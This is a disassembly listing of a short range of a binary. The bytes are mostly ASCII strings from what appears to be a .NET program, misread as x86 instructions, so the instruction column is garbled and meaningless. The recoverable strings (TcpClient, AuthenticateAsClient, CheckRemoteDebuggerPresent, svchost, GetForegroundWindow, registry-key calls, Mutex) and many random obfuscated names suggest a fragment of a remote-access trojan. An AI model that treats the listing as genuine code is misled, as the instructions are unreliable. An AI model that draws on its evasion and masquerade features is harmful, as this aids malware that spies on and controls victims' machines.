  409a2b:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a32:	74 5f                	je     0x409a93
  409a34:	54                   	push   %esp
  409a35:	63 70 43             	arpl   %esi,0x43(%eax)
  409a38:	6c                   	insb   (%dx),%es:(%edi)
  409a39:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a40:	74 5f                	je     0x409aa1
  409a42:	54                   	push   %esp
  409a43:	63 70 43             	arpl   %esi,0x43(%eax)
  409a46:	6c                   	insb   (%dx),%es:(%edi)
  409a47:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409a4e:	74 68                	je     0x409ab8
  409a50:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a52:	74 69                	je     0x409abd
  409a54:	63 61 74             	arpl   %esp,0x74(%ecx)
  409a57:	65 41                	gs inc %ecx
  409a59:	73 43                	jae    0x409a9e
  409a5b:	6c                   	insb   (%dx),%es:(%edi)
  409a5c:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  409a63:	73 74                	jae    0x409ad9
  409a65:	65 6d                	gs insl (%dx),%es:(%edi)
  409a67:	2e 4d                	cs dec %ebp
  409a69:	61                   	popa
  409a6a:	6e                   	outsb  %ds:(%esi),(%dx)
  409a6b:	61                   	popa
  409a6c:	67 65 6d             	gs insl (%dx),%es:(%di)
  409a6f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a71:	74 00                	je     0x409a73
  409a73:	45                   	inc    %ebp
  409a74:	6e                   	outsb  %ds:(%esi),(%dx)
  409a75:	76 69                	jbe    0x409ae0
  409a77:	72 6f                	jb     0x409ae8
  409a79:	6e                   	outsb  %ds:(%esi),(%dx)
  409a7a:	6d                   	insl   (%dx),%es:(%edi)
  409a7b:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a7d:	74 00                	je     0x409a7f
  409a7f:	53                   	push   %ebx
  409a80:	79 73                	jns    0x409af5
  409a82:	74 65                	je     0x409ae9
  409a84:	6d                   	insl   (%dx),%es:(%edi)
  409a85:	2e 43                	cs inc %ebx
  409a87:	6f                   	outsl  %ds:(%esi),(%dx)
  409a88:	6c                   	insb   (%dx),%es:(%edi)
  409a89:	6c                   	insb   (%dx),%es:(%edi)
  409a8a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409a8f:	6e                   	outsb  %ds:(%esi),(%dx)
  409a90:	73 2e                	jae    0x409ac0
  409a92:	49                   	dec    %ecx
  409a93:	45                   	inc    %ebp
  409a94:	6e                   	outsb  %ds:(%esi),(%dx)
  409a95:	75 6d                	jne    0x409b04
  409a97:	65 72 61             	gs jb  0x409afb
  409a9a:	74 6f                	je     0x409b0b
  409a9c:	72 2e                	jb     0x409acc
  409a9e:	67 65 74 5f          	addr16 gs je 0x409b01
  409aa2:	43                   	inc    %ebx
  409aa3:	75 72                	jne    0x409b17
  409aa5:	72 65                	jb     0x409b0c
  409aa7:	6e                   	outsb  %ds:(%esi),(%dx)
  409aa8:	74 00                	je     0x409aaa
  409aaa:	47                   	inc    %edi
  409aab:	65 74 43             	gs je  0x409af1
  409aae:	75 72                	jne    0x409b22
  409ab0:	72 65                	jb     0x409b17
  409ab2:	6e                   	outsb  %ds:(%esi),(%dx)
  409ab3:	74 00                	je     0x409ab5
  409ab5:	43                   	inc    %ebx
  409ab6:	68 65 63 6b 52       	push   $0x526b6365
  409abb:	65 6d                	gs insl (%dx),%es:(%edi)
  409abd:	6f                   	outsl  %ds:(%esi),(%dx)
  409abe:	74 65                	je     0x409b25
  409ac0:	44                   	inc    %esp
  409ac1:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409ac5:	67 65 72 50          	addr16 gs jb 0x409b19
  409ac9:	72 65                	jb     0x409b30
  409acb:	73 65                	jae    0x409b32
  409acd:	6e                   	outsb  %ds:(%esi),(%dx)
  409ace:	74 00                	je     0x409ad0
  409ad0:	67 65 74 5f          	addr16 gs je 0x409b33
  409ad4:	52                   	push   %edx
  409ad5:	65 6d                	gs insl (%dx),%es:(%edi)
  409ad7:	6f                   	outsl  %ds:(%esi),(%dx)
  409ad8:	74 65                	je     0x409b3f
  409ada:	45                   	inc    %ebp
  409adb:	6e                   	outsb  %ds:(%esi),(%dx)
  409adc:	64 50                	fs push %eax
  409ade:	6f                   	outsl  %ds:(%esi),(%dx)
  409adf:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409ae6:	5f                   	pop    %edi
  409ae7:	43                   	inc    %ebx
  409ae8:	6f                   	outsl  %ds:(%esi),(%dx)
  409ae9:	75 6e                	jne    0x409b59
  409aeb:	74 00                	je     0x409aed
  409aed:	67 65 74 5f          	addr16 gs je 0x409b50
  409af1:	50                   	push   %eax
  409af2:	72 6f                	jb     0x409b63
  409af4:	63 65 73             	arpl   %esp,0x73(%ebp)
  409af7:	73 6f                	jae    0x409b68
  409af9:	72 43                	jb     0x409b3e
  409afb:	6f                   	outsl  %ds:(%esi),(%dx)
  409afc:	75 6e                	jne    0x409b6c
  409afe:	74 00                	je     0x409b00
  409b00:	47                   	inc    %edi
  409b01:	65 74 50             	gs je  0x409b54
  409b04:	61                   	popa
  409b05:	74 68                	je     0x409b6f
  409b07:	52                   	push   %edx
  409b08:	6f                   	outsl  %ds:(%esi),(%dx)
  409b09:	6f                   	outsl  %ds:(%esi),(%dx)
  409b0a:	74 00                	je     0x409b0c
  409b0c:	61                   	popa
  409b0d:	78 50                	js     0x409b5f
  409b0f:	64 51                	fs push %ecx
  409b11:	48                   	dec    %eax
  409b12:	5a                   	pop    %edx
  409b13:	6c                   	insb   (%dx),%es:(%edi)
  409b14:	71 74                	jno    0x409b8a
  409b16:	00 50 61             	add    %dl,0x61(%eax)
  409b19:	72 61                	jb     0x409b7c
  409b1b:	6d                   	insl   (%dx),%es:(%edi)
  409b1c:	65 74 65             	gs je  0x409b84
  409b1f:	72 69                	jb     0x409b8a
  409b21:	7a 65                	jp     0x409b88
  409b23:	64 54                	fs push %esp
  409b25:	68 72 65 61 64       	push   $0x64616572
  409b2a:	53                   	push   %ebx
  409b2b:	74 61                	je     0x409b8e
  409b2d:	72 74                	jb     0x409ba3
  409b2f:	00 43 6f             	add    %al,0x6f(%ebx)
  409b32:	6e                   	outsb  %ds:(%esi),(%dx)
  409b33:	76 65                	jbe    0x409b9a
  409b35:	72 74                	jb     0x409bab
  409b37:	00 46 61             	add    %al,0x61(%esi)
  409b3a:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409b41:	54 
  409b42:	6f                   	outsl  %ds:(%esi),(%dx)
  409b43:	4c                   	dec    %esp
  409b44:	69 73 74 00 73 76 63 	imul   $0x63767300,0x74(%ebx),%esi
  409b4b:	68 6f 73 74 00       	push   $0x74736f
  409b50:	53                   	push   %ebx
  409b51:	79 73                	jns    0x409bc6
  409b53:	74 65                	je     0x409bba
  409b55:	6d                   	insl   (%dx),%es:(%edi)
  409b56:	2e 43                	cs inc %ebx
  409b58:	6f                   	outsl  %ds:(%esi),(%dx)
  409b59:	6c                   	insb   (%dx),%es:(%edi)
  409b5a:	6c                   	insb   (%dx),%es:(%edi)
  409b5b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409b60:	6e                   	outsb  %ds:(%esi),(%dx)
  409b61:	73 2e                	jae    0x409b91
  409b63:	49                   	dec    %ecx
  409b64:	45                   	inc    %ebp
  409b65:	6e                   	outsb  %ds:(%esi),(%dx)
  409b66:	75 6d                	jne    0x409bd5
  409b68:	65 72 61             	gs jb  0x409bcc
  409b6b:	74 6f                	je     0x409bdc
  409b6d:	72 2e                	jb     0x409b9d
  409b6f:	4d                   	dec    %ebp
  409b70:	6f                   	outsl  %ds:(%esi),(%dx)
  409b71:	76 65                	jbe    0x409bd8
  409b73:	4e                   	dec    %esi
  409b74:	65 78 74             	gs js  0x409beb
  409b77:	00 53 79             	add    %dl,0x79(%ebx)
  409b7a:	73 74                	jae    0x409bf0
  409b7c:	65 6d                	gs insl (%dx),%es:(%edi)
  409b7e:	2e 54                	cs push %esp
  409b80:	65 78 74             	gs js  0x409bf7
  409b83:	00 47 65             	add    %al,0x65(%edi)
  409b86:	74 57                	je     0x409bdf
  409b88:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409b8f:	78 74                	js     0x409c05
  409b91:	00 64 65 77          	add    %ah,0x77(%ebp,%eiz,2)
  409b95:	61                   	popa
  409b96:	6e                   	outsb  %ds:(%esi),(%dx)
  409b97:	63 4b 50             	arpl   %ecx,0x50(%ebx)
  409b9a:	62 73 78             	bound  %esi,0x78(%ebx)
  409b9d:	74 00                	je     0x409b9f
  409b9f:	74 6e                	je     0x409c0f
  409ba1:	41                   	inc    %ecx
  409ba2:	72 42                	jb     0x409be6
  409ba4:	55                   	push   %ebp
  409ba5:	51                   	push   %ecx
  409ba6:	66 50                	push   %ax
  409ba8:	77 78                	ja     0x409c22
  409baa:	77 4d                	ja     0x409bf9
  409bac:	7a 74                	jp     0x409c22
  409bae:	00 59 73             	add    %bl,0x73(%ecx)
  409bb1:	46                   	inc    %esi
  409bb2:	51                   	push   %ecx
  409bb3:	61                   	popa
  409bb4:	77 4c                	ja     0x409c02
  409bb6:	46                   	inc    %esi
  409bb7:	74 46                	je     0x409bff
  409bb9:	44                   	inc    %esp
  409bba:	75 00                	jne    0x409bbc
  409bbc:	46                   	inc    %esi
  409bbd:	4f                   	dec    %edi
  409bbe:	64 62 76 79          	bound  %esi,%fs:0x79(%esi)
  409bc2:	51                   	push   %ecx
  409bc3:	6a 66                	push   $0x66
  409bc5:	75 7a                	jne    0x409c41
  409bc7:	44                   	inc    %esp
  409bc8:	46                   	inc    %esi
  409bc9:	75 00                	jne    0x409bcb
  409bcb:	44                   	inc    %esp
  409bcc:	66 48                	dec    %ax
  409bce:	53                   	push   %ebx
  409bcf:	6c                   	insb   (%dx),%es:(%edi)
  409bd0:	56                   	push   %esi
  409bd1:	54                   	push   %esp
  409bd2:	48                   	dec    %eax
  409bd3:	51                   	push   %ecx
  409bd4:	46                   	inc    %esi
  409bd5:	75 00                	jne    0x409bd7
  409bd7:	44                   	inc    %esp
  409bd8:	47                   	inc    %edi
  409bd9:	58                   	pop    %eax
  409bda:	70 68                	jo     0x409c44
  409bdc:	41                   	inc    %ecx
  409bdd:	76 7a                	jbe    0x409c59
  409bdf:	48                   	dec    %eax
  409be0:	45                   	inc    %ebp
  409be1:	67 64 52             	addr16 fs push %edx
  409be4:	4b                   	dec    %ebx
  409be5:	75 00                	jne    0x409be7
  409be7:	68 50 47 7a 4e       	push   $0x4e7a4750
  409bec:	68 6b 61 52 46       	push   $0x4652616b
  409bf1:	4c                   	dec    %esp
  409bf2:	4c                   	dec    %esp
  409bf3:	75 00                	jne    0x409bf5
  409bf5:	74 54                	je     0x409c4b
  409bf7:	6a 41                	push   $0x41
  409bf9:	68 4d 4e 66 56       	push   $0x56664e4d
  409bfe:	41                   	inc    %ecx
  409bff:	52                   	push   %edx
  409c00:	75 00                	jne    0x409c02
  409c02:	48                   	dec    %eax
  409c03:	53                   	push   %ebx
  409c04:	53                   	push   %ebx
  409c05:	57                   	push   %edi
  409c06:	70 71                	jo     0x409c79
  409c08:	4c                   	dec    %esp
  409c09:	4e                   	dec    %esi
  409c0a:	45                   	inc    %ebp
  409c0b:	6b 4a 6f 55          	imul   $0x55,0x6f(%edx),%ecx
  409c0f:	75 00                	jne    0x409c11
  409c11:	6d                   	insl   (%dx),%es:(%edi)
  409c12:	57                   	push   %edi
  409c13:	65 7a 4f             	gs jp  0x409c65
  409c16:	4a                   	dec    %edx
  409c17:	6b 43 67 6b          	imul   $0x6b,0x67(%ebx),%eax
  409c1b:	5a                   	pop    %edx
  409c1c:	57                   	push   %edi
  409c1d:	75 00                	jne    0x409c1f
  409c1f:	64 66 7a 68          	fs data16 jp 0x409c8b
  409c23:	51                   	push   %ecx
  409c24:	6a 64                	push   $0x64
  409c26:	67 4c                	addr16 dec %esp
  409c28:	59                   	pop    %ecx
  409c29:	4c                   	dec    %esp
  409c2a:	59                   	pop    %ecx
  409c2b:	75 00                	jne    0x409c2d
  409c2d:	4f                   	dec    %edi
  409c2e:	46                   	inc    %esi
  409c2f:	64 42                	fs inc %edx
  409c31:	76 73                	jbe    0x409ca6
  409c33:	45                   	inc    %ebp
  409c34:	4b                   	dec    %ebx
  409c35:	6e                   	outsb  %ds:(%esi),(%dx)
  409c36:	6d                   	insl   (%dx),%es:(%edi)
  409c37:	57                   	push   %edi
  409c38:	58                   	pop    %eax
  409c39:	71 65                	jno    0x409ca0
  409c3b:	6c                   	insb   (%dx),%es:(%edi)
  409c3c:	69 75 00 4a 6a 52 53 	imul   $0x53526a4a,0x0(%ebp),%esi
  409c43:	4d                   	dec    %ebp
  409c44:	45                   	inc    %ebp
  409c45:	6b 70 76 49          	imul   $0x49,0x76(%eax),%esi
  409c49:	4b                   	dec    %ebx
  409c4a:	76 71                	jbe    0x409cbd
  409c4c:	6a 75                	push   $0x75
  409c4e:	00 52 4f             	add    %dl,0x4f(%edx)
  409c51:	48                   	dec    %eax
  409c52:	62 6e 7a             	bound  %ebp,0x7a(%esi)
  409c55:	78 56                	js     0x409cad
  409c57:	4f                   	dec    %edi
  409c58:	79 6a                	jns    0x409cc4
  409c5a:	75 00                	jne    0x409c5c
  409c5c:	66 72 6c             	data16 jb 0x409ccb
  409c5f:	77 4a                	ja     0x409cab
  409c61:	62 4f 69             	bound  %ecx,0x69(%edi)
  409c64:	6a 6e                	push   $0x6e
  409c66:	75 00                	jne    0x409c68
  409c68:	73 55                	jae    0x409cbf
  409c6a:	52                   	push   %edx
  409c6b:	7a 70                	jp     0x409cdd
  409c6d:	6e                   	outsb  %ds:(%esi),(%dx)
  409c6e:	4a                   	dec    %edx
  409c6f:	73 42                	jae    0x409cb3
  409c71:	71 6e                	jno    0x409ce1
  409c73:	75 00                	jne    0x409c75
  409c75:	59                   	pop    %ecx
  409c76:	47                   	inc    %edi
  409c77:	76 64                	jbe    0x409cdd
  409c79:	78 79                	js     0x409cf4
  409c7b:	70 49                	jo     0x409cc6
  409c7d:	41                   	inc    %ecx
  409c7e:	6a 6f                	push   $0x6f
  409c80:	75 00                	jne    0x409c82
  409c82:	71 74                	jno    0x409cf8
  409c84:	79 62                	jns    0x409ce8
  409c86:	57                   	push   %edi
  409c87:	43                   	inc    %ebx
  409c88:	48                   	dec    %eax
  409c89:	76 55                	jbe    0x409ce0
  409c8b:	53                   	push   %ebx
  409c8c:	6b 64 4d 4f 78       	imul   $0x78,0x4f(%ebp,%ecx,2),%esp
  409c91:	75 00                	jne    0x409c93
  409c93:	68 78 6e 4d 41       	push   $0x414d6e78
  409c98:	4c                   	dec    %esp
  409c99:	4a                   	dec    %edx
  409c9a:	75 4a                	jne    0x409ce6
  409c9c:	54                   	push   %esp
  409c9d:	78 75                	js     0x409d14
  409c9f:	00 54 52 75          	add    %dl,0x75(%edx,%edx,2)
  409ca3:	6d                   	insl   (%dx),%es:(%edi)
  409ca4:	4f                   	dec    %edi
  409ca5:	6f                   	outsl  %ds:(%esi),(%dx)
  409ca6:	70 52                	jo     0x409cfa
  409ca8:	4a                   	dec    %edx
  409ca9:	50                   	push   %eax
  409caa:	47                   	inc    %edi
  409cab:	76 6b                	jbe    0x409d18
  409cad:	6d                   	insl   (%dx),%es:(%edi)
  409cae:	41                   	inc    %ecx
  409caf:	76 00                	jbe    0x409cb1
  409cb1:	64 53                	fs push %ebx
  409cb3:	79 6b                	jns    0x409d20
  409cb5:	41                   	inc    %ecx
  409cb6:	50                   	push   %eax
  409cb7:	59                   	pop    %ecx
  409cb8:	66 68 5a 78          	pushw  $0x785a
  409cbc:	6e                   	outsb  %ds:(%esi),(%dx)
  409cbd:	78 79                	js     0x409d38
  409cbf:	43                   	inc    %ebx
  409cc0:	76 00                	jbe    0x409cc2
  409cc2:	51                   	push   %ecx
  409cc3:	63 45 41             	arpl   %eax,0x41(%ebp)
  409cc6:	54                   	push   %esp
  409cc7:	66 6d                	insw   (%dx),%es:(%edi)
  409cc9:	76 62                	jbe    0x409d2d
  409ccb:	6a 55                	push   $0x55
  409ccd:	76 00                	jbe    0x409ccf
  409ccf:	71 4e                	jno    0x409d1f
  409cd1:	4d                   	dec    %ebp
  409cd2:	53                   	push   %ebx
  409cd3:	75 4b                	jne    0x409d20
  409cd5:	6e                   	outsb  %ds:(%esi),(%dx)
  409cd6:	5a                   	pop    %edx
  409cd7:	5a                   	pop    %edx
  409cd8:	76 00                	jbe    0x409cda
  409cda:	56                   	push   %esi
  409cdb:	58                   	pop    %eax
  409cdc:	52                   	push   %edx
  409cdd:	75 6e                	jne    0x409d4d
  409cdf:	50                   	push   %eax
  409ce0:	6d                   	insl   (%dx),%es:(%edi)
  409ce1:	56                   	push   %esi
  409ce2:	44                   	inc    %esp
  409ce3:	54                   	push   %esp
  409ce4:	74 76                	je     0x409d5c
  409ce6:	00 6d 6f             	add    %ch,0x6f(%ebp)
  409ce9:	63 4d 6d             	arpl   %ecx,0x6d(%ebp)
  409cec:	4d                   	dec    %ebp
  409ced:	42                   	inc    %edx
  409cee:	72 53                	jb     0x409d43
  409cf0:	48                   	dec    %eax
  409cf1:	77 00                	ja     0x409cf3
  409cf3:	55                   	push   %ebp
  409cf4:	77 76                	ja     0x409d6c
  409cf6:	54                   	push   %esp
  409cf7:	76 56                	jbe    0x409d4f
  409cf9:	4c                   	dec    %esp
  409cfa:	53                   	push   %ebx
  409cfb:	53                   	push   %ebx
  409cfc:	4b                   	dec    %ebx
  409cfd:	4d                   	dec    %ebp
  409cfe:	77 00                	ja     0x409d00
  409d00:	47                   	inc    %edi
  409d01:	65 74 46             	gs je  0x409d4a
  409d04:	6f                   	outsl  %ds:(%esi),(%dx)
  409d05:	72 65                	jb     0x409d6c
  409d07:	67 72 6f             	addr16 jb 0x409d79
  409d0a:	75 6e                	jne    0x409d7a
  409d0c:	64 57                	fs push %edi
  409d0e:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409d15:	65 74 5f             	gs je  0x409d77
  409d18:	43                   	inc    %ebx
  409d19:	72 65                	jb     0x409d80
  409d1b:	61                   	popa
  409d1c:	74 65                	je     0x409d83
  409d1e:	4e                   	dec    %esi
  409d1f:	6f                   	outsl  %ds:(%esi),(%dx)
  409d20:	57                   	push   %edi
  409d21:	69 6e 64 6f 77 00 5a 	imul   $0x5a00776f,0x64(%esi),%ebp
  409d28:	64 7a 4c             	fs jp  0x409d77
  409d2b:	71 6e                	jno    0x409d9b
  409d2d:	62 55 43             	bound  %edx,0x43(%ebp)
  409d30:	71 77                	jno    0x409da9
  409d32:	00 77 4d             	add    %dh,0x4d(%edi)
  409d35:	42                   	inc    %edx
  409d36:	42                   	inc    %edx
  409d37:	56                   	push   %esi
  409d38:	55                   	push   %ebp
  409d39:	75 68                	jne    0x409da3
  409d3b:	67 56                	addr16 push %esi
  409d3d:	79 72                	jns    0x409db1
  409d3f:	77 00                	ja     0x409d41
  409d41:	51                   	push   %ecx
  409d42:	66 61                	popaw
  409d44:	46                   	inc    %esi
  409d45:	59                   	pop    %ecx
  409d46:	56                   	push   %esi
  409d47:	6b 70 66 67          	imul   $0x67,0x66(%eax),%esi
  409d4b:	74 77                	je     0x409dc4
  409d4d:	00 6f 47             	add    %ch,0x47(%edi)
  409d50:	62 4d 79             	bound  %ecx,0x79(%ebp)
  409d53:	49                   	dec    %ecx
  409d54:	77 70                	ja     0x409dc6
  409d56:	72 52                	jb     0x409daa
  409d58:	78 00                	js     0x409d5a
  409d5a:	51                   	push   %ecx
  409d5b:	73 63                	jae    0x409dc0
  409d5d:	59                   	pop    %ecx
  409d5e:	4d                   	dec    %ebp
  409d5f:	43                   	inc    %ebx
  409d60:	65 73 71             	gs jae 0x409dd4
  409d63:	76 63                	jbe    0x409dc8
  409d65:	78 00                	js     0x409d67
  409d67:	4d                   	dec    %ebp
  409d68:	75 74                	jne    0x409dde
  409d6a:	65 78 00             	gs js  0x409d6d
  409d6d:	52                   	push   %edx
  409d6e:	50                   	push   %eax
  409d6f:	52                   	push   %edx
  409d70:	73 4a                	jae    0x409dbc
  409d72:	70 58                	jo     0x409dcc
  409d74:	4b                   	dec    %ebx
  409d75:	59                   	pop    %ecx
  409d76:	6c                   	insb   (%dx),%es:(%edi)
  409d77:	44                   	inc    %esp
  409d78:	66 68 78 00          	pushw  $0x78
  409d7c:	74 64                	je     0x409de2
  409d7e:	68 62 66 67 53       	push   $0x53676662
  409d83:	48                   	dec    %eax
  409d84:	4e                   	dec    %esi
  409d85:	62 75 78             	bound  %esi,0x78(%ebp)
  409d88:	00 51 76             	add    %dl,0x76(%ecx)
  409d8b:	77 49                	ja     0x409dd6
  409d8d:	67 5a                	addr16 pop %edx
  409d8f:	68 4b 6b 75 5a       	push   $0x5a756b4b
  409d94:	41                   	inc    %ecx
  409d95:	7a 78                	jp     0x409e0f
  409d97:	00 58 44             	add    %bl,0x44(%eax)
  409d9a:	73 69                	jae    0x409e05
  409d9c:	78 58                	js     0x409df6
  409d9e:	65 45                	gs inc %ebp
  409da0:	79 7a                	jns    0x409e1c
  409da2:	78 00                	js     0x409da4
  409da4:	54                   	push   %esp
  409da5:	4c                   	dec    %esp
  409da6:	71 4c                	jno    0x409df4
  409da8:	6c                   	insb   (%dx),%es:(%edi)
  409da9:	76 4a                	jbe    0x409df5
  409dab:	70 6a                	jo     0x409e17
  409dad:	4a                   	dec    %edx
  409dae:	6d                   	insl   (%dx),%es:(%edi)
  409daf:	4a                   	dec    %edx
  409db0:	47                   	inc    %edi
  409db1:	79 00                	jns    0x409db3
  409db3:	4d                   	dec    %ebp
  409db4:	69 46 78 71 63 45 73 	imul   $0x73456371,0x78(%esi),%eax
  409dbb:	57                   	push   %edi
  409dbc:	4b                   	dec    %ebx
  409dbd:	79 00                	jns    0x409dbf
  409dbf:	4b                   	dec    %ebx
  409dc0:	79 51                	jns    0x409e13
  409dc2:	61                   	popa
  409dc3:	79 5a                	jns    0x409e1f
  409dc5:	77 67                	ja     0x409e2e
  409dc7:	71 6e                	jno    0x409e37
  409dc9:	73 4c                	jae    0x409e17
  409dcb:	79 00                	jns    0x409dcd
  409dcd:	7a 45                	jp     0x409e14
  409dcf:	79 49                	jns    0x409e1a
  409dd1:	44                   	inc    %esp
  409dd2:	4d                   	dec    %ebp
  409dd3:	7a 5a                	jp     0x409e2f
  409dd5:	59                   	pop    %ecx
  409dd6:	7a 55                	jp     0x409e2d
  409dd8:	4e                   	dec    %esi
  409dd9:	52                   	push   %edx
  409dda:	79 00                	jns    0x409ddc
  409ddc:	49                   	dec    %ecx
  409ddd:	6e                   	outsb  %ds:(%esi),(%dx)
  409dde:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409de5:	65 
  409de6:	41                   	inc    %ecx
  409de7:	72 72                	jb     0x409e5b
  409de9:	61                   	popa
  409dea:	79 00                	jns    0x409dec
  409dec:	54                   	push   %esp
  409ded:	6f                   	outsl  %ds:(%esi),(%dx)
  409dee:	41                   	inc    %ecx
  409def:	72 72                	jb     0x409e63
  409df1:	61                   	popa
  409df2:	79 00                	jns    0x409df4
  409df4:	67 65 74 5f          	addr16 gs je 0x409e57
  409df8:	41                   	inc    %ecx
  409df9:	73 41                	jae    0x409e3c
  409dfb:	72 72                	jb     0x409e6f
  409dfd:	61                   	popa
  409dfe:	79 00                	jns    0x409e00
  409e00:	67 65 74 5f          	addr16 gs je 0x409e63
  409e04:	4b                   	dec    %ebx
  409e05:	65 79 00             	gs jns 0x409e08
  409e08:	73 65                	jae    0x409e6f
  409e0a:	74 5f                	je     0x409e6b
  409e0c:	4b                   	dec    %ebx
  409e0d:	65 79 00             	gs jns 0x409e10
  409e10:	43                   	inc    %ebx
  409e11:	72 65                	jb     0x409e78
  409e13:	61                   	popa
  409e14:	74 65                	je     0x409e7b
  409e16:	53                   	push   %ebx
  409e17:	75 62                	jne    0x409e7b
  409e19:	4b                   	dec    %ebx
  409e1a:	65 79 00             	gs jns 0x409e1d
  409e1d:	4f                   	dec    %edi
  409e1e:	70 65                	jo     0x409e85
  409e20:	6e                   	outsb  %ds:(%esi),(%dx)
  409e21:	53                   	push   %ebx
  409e22:	75 62                	jne    0x409e86
  409e24:	4b                   	dec    %ebx
  409e25:	65 79 00             	gs jns 0x409e28
  409e28:	67 65 74 5f          	addr16 gs je 0x409e8b
  409e2c:	50                   	push   %eax
  409e2d:	75 62                	jne    0x409e91
  409e2f:	6c                   	insb   (%dx),%es:(%edi)
  409e30:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409e37:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409e3e:	4b 65 
  409e40:	79 00                	jns    0x409e42
  409e42:	53                   	push   %ebx
  409e43:	79 73                	jns    0x409eb8
  409e45:	74 65                	je     0x409eac
  409e47:	6d                   	insl   (%dx),%es:(%edi)
  409e48:	2e 53                	cs push %ebx
  409e4a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e4e:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409e55:	70 
  409e56:	74 6f                	je     0x409ec7
  409e58:	67 72 61             	addr16 jb 0x409ebc
  409e5b:	70 68                	jo     0x409ec5
  409e5d:	79 00                	jns    0x409e5f
  409e5f:	41                   	inc    %ecx
  409e60:	73 73                	jae    0x409ed5
  409e62:	65 6d                	gs insl (%dx),%es:(%edi)
  409e64:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409e68:	41                   	inc    %ecx
  409e69:	64 64 72 65          	fs fs jb 0x409ed2
  409e6d:	73 73                	jae    0x409ee2
  409e6f:	46                   	inc    %esi
  409e70:	61                   	popa
  409e71:	6d                   	insl   (%dx),%es:(%edi)
  409e72:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409e79:	63 
  409e7a:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409e7e:	79 00                	jns    0x409e80
  409e80:	54                   	push   %esp
  409e81:	6f                   	outsl  %ds:(%esi),(%dx)
  409e82:	42                   	inc    %edx
  409e83:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409e8a:	65 74 5f             	gs je  0x409eec
  409e8d:	53                   	push   %ebx
  409e8e:	79 73                	jns    0x409f03
  409e90:	74 65                	je     0x409ef7
  409e92:	6d                   	insl   (%dx),%es:(%edi)
  409e93:	44                   	inc    %esp
  409e94:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409e9b:	79 00                	jns    0x409e9d
  409e9d:	52                   	push   %edx
  409e9e:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409ea5:	00 6f 
  409ea7:	70 5f                	jo     0x409f08
  409ea9:	45                   	inc    %ebp
  409eaa:	71 75                	jno    0x409f21
  409eac:	61                   	popa
  409ead:	6c                   	insb   (%dx),%es:(%edi)
  409eae:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409eb5:	49 
  409eb6:	6e                   	outsb  %ds:(%esi),(%dx)
  409eb7:	65 71 75             	gs jno 0x409f2f
  409eba:	61                   	popa
  409ebb:	6c                   	insb   (%dx),%es:(%edi)
  409ebc:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409ec3:	74 
  409ec4:	65 6d                	gs insl (%dx),%es:(%edi)
  409ec6:	2e 4e                	cs dec %esi
  409ec8:	65 74 2e             	gs je  0x409ef9
  409ecb:	53                   	push   %ebx
  409ecc:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409ed0:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409ed7:	64 
  409ed8:	6f                   	outsl  %ds:(%esi),(%dx)
  409ed9:	77 73                	ja     0x409f4e
  409edb:	49                   	dec    %ecx
  409edc:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409edf:	74 69                	je     0x409f4a
  409ee1:	74 79                	je     0x409f5c
  409ee3:	00 49 73             	add    %cl,0x73(%ecx)
  409ee6:	4e                   	dec    %esi
  409ee7:	75 6c                	jne    0x409f55
  409ee9:	6c                   	insb   (%dx),%es:(%edi)
  409eea:	4f                   	dec    %edi
  409eeb:	72 45                	jb     0x409f32
  409eed:	6d                   	insl   (%dx),%es:(%edi)
  409eee:	70 74                	jo     0x409f64
  409ef0:	79 00                	jns    0x409ef2
  409ef2:	6d                   	insl   (%dx),%es:(%edi)
  409ef3:	63 79 41             	arpl   %edi,0x41(%ecx)
  409ef6:	62 75 53             	bound  %esi,0x53(%ebp)
  409ef9:	6b 42 76 79          	imul   $0x79,0x76(%edx),%eax
  409efd:	00 51 6e             	add    %dl,0x6e(%ecx)
  409f00:	58                   	pop    %eax
  409f01:	45                   	inc    %ebp
  409f02:	4f                   	dec    %edi
  409f03:	71 4b                	jno    0x409f50
  409f05:	50                   	push   %eax
  409f06:	6b 47 6a 64          	imul   $0x64,0x6a(%edi),%eax
  409f0a:	4a                   	dec    %edx
  409f0b:	7a 00                	jp     0x409f0d
  409f0d:	6f                   	outsl  %ds:(%esi),(%dx)
  409f0e:	4f                   	dec    %edi
  409f0f:	59                   	pop    %ecx
  409f10:	76 57                	jbe    0x409f69
  409f12:	71 56                	jno    0x409f6a
  409f14:	74 6a                	je     0x409f80
